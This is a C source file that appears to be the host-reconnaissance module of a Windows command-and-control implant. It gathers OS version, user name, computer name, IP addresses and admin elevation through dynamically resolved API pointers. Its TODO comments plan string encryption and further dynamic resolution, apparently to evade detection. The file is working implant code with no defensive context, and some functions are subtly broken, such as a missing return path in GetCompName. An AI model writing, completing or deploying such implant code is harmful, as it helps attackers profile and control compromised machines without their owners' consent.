#include "../../headers/enumeration/enum.h"
#include "../../headers/enumeration/token.h"

//TODO finish enumeration

BOOL Enumerate()
{
	//TODO: this may be an issue since we're not allocating memory manually & copying it into buffer.
	if(GetOperatingSystemFunc() != 0) {
		printf("[error] attempting to get operating system information\n");
		return FALSE;
	}
	if (GetUser() != 0) {
		printf("[error] attempting to get user information\n");
		return FALSE;
	}
	if ( GetCompName() != 0) {
		printf("[error] attempting to get computer name\n");
		return FALSE;
	}
	if( GetIPAddress() != 0) {
		printf("[error] attempting to get ip address\n");
		return FALSE;
	}

	agent->Context->Elevated = IsElevated();
	return TRUE;
}

//TODO replacee all strings with encoded / encrypted content.
INT GetOperatingSystemFunc() {
	LPCSTR OS = NULL;
	RTL_OSVERSIONINFOEXW lpVersionInformation = { 0 };
	lpVersionInformation.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOEXW);
	NTSTATUS status = 0;
	status = agent->apis->pRtlGetVersion(&lpVersionInformation);
	if (status != NTSUCCESS) {
		printf("[error] attempting to retrieve the operating system versions. [%08X]", status);
		return -1;
	}
	agent->Context->dwMajorVersion = lpVersionInformation.dwMajorVersion;
	agent->Context->dwMinorVersion = lpVersionInformation.dwMinorVersion;
	agent->Context->wProductType = lpVersionInformation.wProductType;
	agent->Context->dwBuildNumber = lpVersionInformation.dwBuildNumber;
	agent->Context->dwPlatformId = lpVersionInformation.dwPlatformId;
	agent->Context->wServicePackMajor = lpVersionInformation.wServicePackMajor;
	agent->Context->wServicePackMinor = lpVersionInformation.wServicePackMinor;
	agent->Context->wSuiteMask = lpVersionInformation.wSuiteMask;
	
	return 0;
}


INT GetUser() {
	PVOID            Data = NULL;
	DWORD            dwLength = UNLEN + 1;

	if (Data = agent->apis->pLocalAlloc(LPTR, dwLength)) {
		agent->apis->pGetUserNameA(Data, &dwLength);
		agent->Context->UserName = Data;
		return 0;
	}
	return -1;
	
}


//TODO replace this with a function that obtians comptuer name from registry or from env variables.
INT GetCompName() {
	PVOID            Data = NULL;
	SIZE_T           Length = 0;
	DWORD            dwLength = 0;

	if (!agent->apis->pGetComputerNameExA(ComputerNameNetBIOS, NULL, &dwLength))
	{
		if ((Data = agent->apis->pLocalAlloc(LPTR, dwLength)))
		{
			if (agent->apis->pGetComputerNameExA(ComputerNameNetBIOS, Data, &dwLength))
			{
				agent->Context->ComputerName = Data;
				return 0;
			}
			else {
				agent->apis->pLocalFree(Data);
				return -1;
			}
		}
	}

	
}
//TODO FIX THIS SHIT
INT GetIPAddress() {
	DWORD dwLength = 0;
	PIP_ADAPTER_INFO adapter;
	INT AdapterCount = 0;

	if (agent->apis->pGetAdaptersInfo(NULL, &dwLength)) {
		if ((adapter = (PIP_ADAPTER_INFO)agent->apis->pLocalAlloc(LPTR, dwLength)))
		{
			if (adapter) {

				if (agent->apis->pGetAdaptersInfo(adapter, &dwLength) == NO_ERROR) {
					PIP_ADAPTER_INFO TmpAdapter = adapter;
					while (TmpAdapter && AdapterCount < 10) {

						if (strncmp(TmpAdapter->Description, "Bluetooth", 9) == 0) {
							TmpAdapter = TmpAdapter->Next;
							continue;
						}
						if (strncmp(TmpAdapter->Description, "VMware", 6) == 0) {
							TmpAdapter = TmpAdapter->Next;
							continue;
						}
						if (strncmp(TmpAdapter->Description, "ExpressVPN", 10) == 0) {
							TmpAdapter = TmpAdapter->Next;
							continue;
						}
						if (strncmp(TmpAdapter->Description, "Hyper-V", 7) == 0) {
							TmpAdapter = TmpAdapter->Next;
							continue;
						}
							

						PIP_ADDR_STRING pIpAddressList = &TmpAdapter->IpAddressList;
						INT IPAddressCount = 1;
						

						while (pIpAddressList && IPAddressCount < 5) {
							if (strcmp(pIpAddressList->IpAddress.String, "0.0.0.0") != 0) {
								if (IPAddressCount == 1) {
									agent->Context->IPAddress[AdapterCount][0] = agent->apis->pLocalAlloc(LPTR, StringLengthA(TmpAdapter->Description));
									MemoryCopy(agent->Context->IPAddress[AdapterCount][0], TmpAdapter->Description, StringLengthA(TmpAdapter->Description));
								}
								agent->Context->IPAddress[AdapterCount][IPAddressCount] = agent->apis->pLocalAlloc(LPTR, StringLengthA(pIpAddressList->IpAddress.String));
								MemoryCopy(agent->Context->IPAddress[AdapterCount][IPAddressCount], pIpAddressList->IpAddress.String, StringLengthA(pIpAddressList->IpAddress.String));

								IPAddressCount++;
							}
							pIpAddressList = pIpAddressList->Next;
						}
						AdapterCount++;
						TmpAdapter = TmpAdapter->Next;
					}
					agent->apis->pLocalFree(adapter);
					return 0;
				}
				agent->apis->pLocalFree(adapter);
				return -1;
			}
			return -1;
		}
		return -1;
	}
	return -1;
}

BOOL IsElevated() {
	HANDLE Token = { 0 };
	BOOL   Admin = FALSE;

	/* query if current process token is elevated or not */
	if ((Token = TokenCurrentHandle())) {
		Admin = TokenElevated(Token);
	}

	/* close token handle */
	if (Token) {
		agent->apis->pNtClose(Token); //TODO redifine NtClose through dynamic resolution.
	}

	return Admin;
}